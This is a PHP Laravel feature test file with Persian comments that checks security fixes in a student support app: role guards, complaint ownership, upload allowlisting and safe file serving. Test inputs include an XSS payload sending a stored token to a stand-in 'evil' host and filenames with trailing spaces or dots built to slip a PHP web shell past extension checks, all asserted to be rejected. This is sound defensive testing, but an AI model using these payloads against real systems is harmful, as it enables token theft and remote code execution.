<?php

namespace Tests\Feature;

use App\Models\Complaint;
use App\Models\Conversation;
use App\Models\Mentor;
use App\Models\Student;
use Illuminate\Http\Testing\File;
use PHPUnit\Framework\Attributes\DataProvider;
use Tests\TestCase;

/**
 * بازبستن سه راه‌حل امنیتی بحرانی:
 *   ۱) مسیرهای محتوای پنل محافظ نقش نداشتند
 *   ۲) شکایت‌ها بدون بررسی مالکیت قابل خواندن/تغییر بودند
 *   ۳) پیوست‌ها allowlist نداشتند (XSS ذخیره‌شده) و بای‌پس اکستنشن داشتند
 */
class SecurityHardeningTest extends TestCase
{
    // ------------------------------------------------- ۱) محافظ نقش مسیرهای پنل

    /**
     * @return array<string, array{0: string, 1: string, 2: string}>
     */
    public static function panelContentEndpoints(): array
    {
        return [
            'delete faq' => ['deleteJson', '/api/faqs/1', 'CheckRole'],
            'update faq' => ['putJson', '/api/faqs/1', 'CheckRole'],
            'store faq' => ['postJson', '/api/faqs', 'CheckRole'],
            'delete video' => ['deleteJson', '/api/videos/1', 'CheckRole'],
            'update video' => ['putJson', '/api/videos/1', 'CheckRole'],
            'delete resource' => ['deleteJson', '/api/resources/1', 'CheckRole'],
            'store resource' => ['postJson', '/api/resources', 'CheckRole'],
            'list complaints' => ['getJson', '/api/complaints', 'CheckRole'],
            'complaint students' => ['getJson', '/api/complaints/students', 'CheckRole'],
            'complaint latest' => ['getJson', '/api/complaints/latest', 'CheckRole'],
            'update complaint' => ['putJson', '/api/complaints/1', 'CheckRole'],
            'pending shift reports' => ['getJson', '/api/shift-reports/pending', 'CheckRole'],
            'list shift reports' => ['getJson', '/api/shift-reports', 'CheckRole'],
            'update shift report' => ['putJson', '/api/shift-reports/1', 'CheckRole'],
        ];
    }

    #[DataProvider('panelContentEndpoints')]
    public function test_students_cannot_reach_panel_content_endpoints(
        string $method,
        string $uri,
    ): void {
        $student = $this->makeStudent();

        $this->actingAs($student, 'sanctum')
            ->{$method}($uri)
            ->assertStatus(403);
    }

    #[DataProvider('panelContentEndpoints')]
    public function test_observers_cannot_reach_panel_content_endpoints(
        string $method,
        string $uri,
    ): void {
        $observer = $this->makeObserver();

        $this->actingAs($observer, 'sanctum')
            ->{$method}($uri)
            ->assertStatus(403);
    }

    public function test_support_can_still_manage_panel_content(): void
    {
        $support = $this->makeSupport();

        $this->actingAs($support, 'sanctum')
            ->postJson('/api/faqs', [
                'question' => 'سوال آزمایشی',
                'answer' => 'پاسخ آزمایشی',
                'category' => 'general',
            ])->assertStatus(201);
    }

    // ------------------------------------------------- ۲) مالکیت شکایت

    public function test_support_cannot_read_or_modify_another_agents_complaint(): void
    {
        $owner = $this->makeSupport();
        $intruder = $this->makeSupport();

        $complaint = Complaint::create([
            'student_id' => Student::create(['name' => 'دانشجو تست'])->id,
            'mentor_id' => Mentor::create(['name' => 'منتور تست'])->id,
            'support_id' => $owner->id,
            'description' => 'شکایت محرمانه',
            'status' => 'open',
        ]);

        $this->actingAs($intruder, 'sanctum')
            ->getJson("/api/complaints/{$complaint->id}")
            ->assertStatus(403);

        $this->actingAs($intruder, 'sanctum')
            ->putJson("/api/complaints/{$complaint->id}", ['status' => 'resolved'])
            ->assertStatus(403);

        $this->assertSame('open', $complaint->fresh()->status);
    }

    public function test_owner_and_admin_can_still_access_their_complaint(): void
    {
        $owner = $this->makeSupport();
        $admin = $this->makeAdmin();

        $complaint = Complaint::create([
            'student_id' => Student::create(['name' => 'دانشجو تست'])->id,
            'mentor_id' => Mentor::create(['name' => 'منتور تست'])->id,
            'support_id' => $owner->id,
            'description' => 'شکایت',
            'status' => 'open',
        ]);

        $this->actingAs($owner, 'sanctum')
            ->getJson("/api/complaints/{$complaint->id}")
            ->assertStatus(200);

        $this->actingAs($admin, 'sanctum')
            ->getJson("/api/complaints/{$complaint->id}")
            ->assertStatus(200);
    }

    public function test_students_list_is_scoped_to_the_viewers_own_complaints(): void
    {
        $mine = $this->makeSupport();
        $other = $this->makeSupport();

        $myStudent = Student::create(['name' => 'دانشجوی من']);
        $otherStudent = Student::create(['name' => 'دانشجوی دیگری']);

        Complaint::create([
            'student_id' => $myStudent->id,
            'mentor_id' => Mentor::create(['name' => 'منتور یک'])->id,
            'support_id' => $mine->id,
            'description' => 'شکایت من',
            'status' => 'open',
        ]);

        Complaint::create([
            'student_id' => $otherStudent->id,
            'mentor_id' => Mentor::create(['name' => 'منتور دو'])->id,
            'support_id' => $other->id,
            'description' => 'شکایت دیگری',
            'status' => 'open',
        ]);

        // پشتیبان فقط دانشجویان شکایت‌های خودش را می‌بیند
        $scoped = $this->actingAs($mine, 'sanctum')
            ->getJson('/api/complaints/students')
            ->assertStatus(200)
            ->json('data');

        $this->assertCount(1, $scoped);
        $this->assertSame('دانشجوی من', $scoped[0]['name']);

        // ادمین هر دو را می‌بیند
        $all = $this->actingAs($this->makeAdmin(), 'sanctum')
            ->getJson('/api/complaints/students')
            ->assertStatus(200)
            ->json('data');

        $names = array_column($all, 'name');
        $this->assertContains('دانشجوی من', $names);
        $this->assertContains('دانشجوی دیگری', $names);
    }

    // ------------------------------------------------- ۳) آپلود پیوست

    public function test_html_and_svg_attachments_are_rejected(): void
    {
        $student = $this->makeStudent();
        $conversation = Conversation::create([
            'student_id' => $student->id,
            'title' => 'تست امنیت',
        ]);

        foreach (['payload.html', 'payload.svg', 'payload.htm'] as $name) {
            $this->actingAs($student, 'sanctum')
                ->postJson("/api/conversations/{$conversation->id}/messages", [
                    'body' => 'تلاش برای بارگذاری فایل مخرب',
                    'attachment' => File::fake()->createWithContent(
                        $name,
                        '<script>fetch("//evil/"+localStorage.aio_token)</script>',
                    ),
                ])->assertStatus(422);
        }
    }

    /**
     * روی ویندوز NTFS فاصله/نقطه‌ی انتهایی نام فایل را حذف می‌کند، پس
     * «payload.php␠» با پسوند php روی دیسک ذخیره می‌شد و توسط Apache
     * اجرا می‌شد. این بای‌پس باید بسته باشد.
     */
    public function test_extension_with_trailing_whitespace_cannot_smuggle_php(): void
    {
        $student = $this->makeStudent();
        $conversation = Conversation::create([
            'student_id' => $student->id,
            'title' => 'تست بای‌پس',
        ]);

        foreach (['shell.php ', 'shell.pHp ', 'shell.php.', 'shell.phtml '] as $name) {
            $this->actingAs($student, 'sanctum')
                ->postJson("/api/conversations/{$conversation->id}/messages", [
                    'body' => 'تلاش برای بارگذاری وب‌شل',
                    'attachment' => File::fake()->createWithContent(
                        $name,
                        '<?php echo "pwned"; ?>',
                    ),
                ])->assertStatus(422);
        }
    }

    public function test_content_type_must_match_the_extension(): void
    {
        $student = $this->makeStudent();
        $conversation = Conversation::create([
            'student_id' => $student->id,
            'title' => 'تست ناهماهنگی',
        ]);

        // پسوند عکس ولی محتوای اسکریپت
        $this->actingAs($student, 'sanctum')
            ->postJson("/api/conversations/{$conversation->id}/messages", [
                'body' => 'عکس جعلی',
                'attachment' => File::fake()->createWithContent(
                    'photo.png',
                    '<script>alert(1)</script>',
                ),
            ])->assertStatus(422);
    }

    public function test_legitimate_image_upload_still_works(): void
    {
        $student = $this->makeStudent();
        $conversation = Conversation::create([
            'student_id' => $student->id,
            'title' => 'تست معتبر',
        ]);

        $png = base64_decode(
            'iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8z8BQDwAEhQGAhKmMIQAAAABJRU5ErkJggg=='
        );

        $this->actingAs($student, 'sanctum')
            ->postJson("/api/conversations/{$conversation->id}/messages", [
                'body' => 'تصویر واقعی',
                'attachment' => File::fake()->createWithContent('shot.png', $png),
            ])->assertStatus(201);
    }

    public function test_attachments_are_not_served_as_executable_content(): void
    {
        $student = $this->makeStudent();
        $conversation = Conversation::create([
            'student_id' => $student->id,
            'title' => 'تست سرو',
        ]);

        $response = $this->actingAs($student, 'sanctum')
            ->postJson("/api/conversations/{$conversation->id}/messages", [
                'body' => 'فایل',
                'attachment' => File::fake()->createWithContent(
                    'note.txt',
                    'متن ساده',
                ),
            ])->assertStatus(201);

        $url = $response->json('data.url');

        $this->assertStringNotContainsString('/storage/', (string) $url);

        $served = $this->actingAs($student, 'sanctum')->get((string) $url);

        $served->assertStatus(200);
        // باید به‌صورت دانلود سرو شود، نه اجرا
        $served->assertHeader('X-Content-Type-Options', 'nosniff');
        $this->assertStringContainsString(
            'application/octet-stream',
            (string) $served->headers->get('Content-Type'),
        );
        $this->assertStringContainsString(
            'attachment',
            (string) $served->headers->get('Content-Disposition'),
        );
    }

    // ------------------------------------------------- ۴) ریت‌لیمیت

    public function test_complaints_limit_parameter_is_bounded(): void
    {
        $support = $this->makeSupport();

        $this->actingAs($support, 'sanctum')
            ->getJson('/api/complaints/latest?limit=10000000')
            ->assertStatus(422);
    }
}
